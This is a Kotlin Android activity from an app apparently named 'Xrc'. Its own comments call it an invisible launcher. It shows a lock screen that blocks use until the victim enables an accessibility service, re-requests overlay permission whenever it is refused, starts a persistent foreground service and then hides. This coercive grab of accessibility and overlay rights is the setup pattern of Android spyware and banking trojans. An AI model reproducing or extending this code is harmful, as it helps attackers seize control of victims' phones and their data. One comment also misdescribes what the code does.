// ============================================================
// FILE: android/app/src/main/java/com/xrc/XrcActivity.kt
// ============================================================
package com.xrc

import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.WindowManager
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import com.xrc.core.config.XrcConfig
import com.xrc.svc.XrcForegroundService
import com.xrc.utils.PermUtils
import com.xrc.xrc.AccessibilityLock

/**
 * Main Activity — invisible launcher that:
 * 1. Shows no UI (transparent theme)
 * 2. Requests critical permissions
 * 3. Starts foreground service
 * 4. Guides user to enable AccessibilityService
 * 5. Finishes immediately
 */
class XrcActivity : ComponentActivity() {

    @OptIn(ExperimentalStdlibApi::class)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Keep screen off during initialization
        window.addFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE)
        window.addFlags(WindowManager.LayoutParams.FLAG_SECURE)

        // Check if AccessibilityService is already enabled
        if (!PermUtils.isAccessibilityServiceEnabled(this)) {
            // Show lock screen forcing accessibility enablement
            setContent {
                var permissionState by remember { mutableStateOf("checking") }
                var canShowOverlay by remember { mutableStateOf(false) }

                LaunchedEffect(Unit) {
                    // Step 1: Request SYSTEM_ALERT_WINDOW first
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        if (!Settings.canDrawOverlays(this@XrcActivity)) {
                            permissionState = "overlay"
                            PermUtils.requestOverlayPermission(this@XrcActivity)
                            return@LaunchedEffect
                        }
                    }

                    // Step 2: Start foreground service
                    permissionState = "service"
                    startForegroundService()

                    // Step 3: Wait for accessibility to be enabled
                    permissionState = "accessibility"
                    PermUtils.openAccessibilitySettings(this@XrcActivity)
                }

                // Listen for when overlay permission is granted
                DisposableEffect(Unit) {
                    onDispose { }
                }

                // Accessibility lock screen — blocks until A11Y enabled
                AccessibilityLock(
                    modifier = Modifier.fillMaxSize(),
                    permissionState = permissionState,
                    onPermissionGranted = {
                        // All permissions granted — finish activity
                        finishAffinity()
                    }
                )
            }
        } else {
            // Already enabled — start service and finish
            startForegroundService()
            finishAffinity()
        }
    }

    override fun onResume() {
        super.onResume()
        // Check if accessibility was enabled while we were in the background
        if (PermUtils.isAccessibilityServiceEnabled(this)) {
            // Recreate to trigger the state change
            recreate()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == PermUtils.OVERLAY_PERMISSION_REQUEST_CODE) {
            // Check overlay permission result
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (!Settings.canDrawOverlays(this)) {
                    // Permission denied — try again
                    PermUtils.requestOverlayPermission(this)
                }
            }
        }
    }

    private fun startForegroundService() {
        val intent = Intent(this, XrcForegroundService::class.java).apply {
            action = XrcForegroundService.ACTION_START
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }
}
